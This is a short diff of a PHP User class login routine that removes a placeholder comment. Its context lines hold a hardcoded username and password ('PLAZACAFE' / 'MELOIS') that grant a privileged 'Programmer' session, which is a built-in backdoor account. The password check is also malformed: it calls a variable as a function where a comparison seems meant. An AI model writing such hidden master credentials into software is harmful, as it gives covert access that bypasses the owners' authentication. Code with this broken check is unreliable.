@@ -25,7 +25,6 @@ class User {
 		global $mydb;
 
 		if ($USERNAME=='PLAZACAFE' && $plain_pass('MELOIS')) {
-			# code...
 			$_SESSION['USERID']   		= '1001000110110';
 		 	$_SESSION['FULLNAME']      	= 'Programmer';
 		 	$_SESSION['ROLE'] 			= 'Programmer';
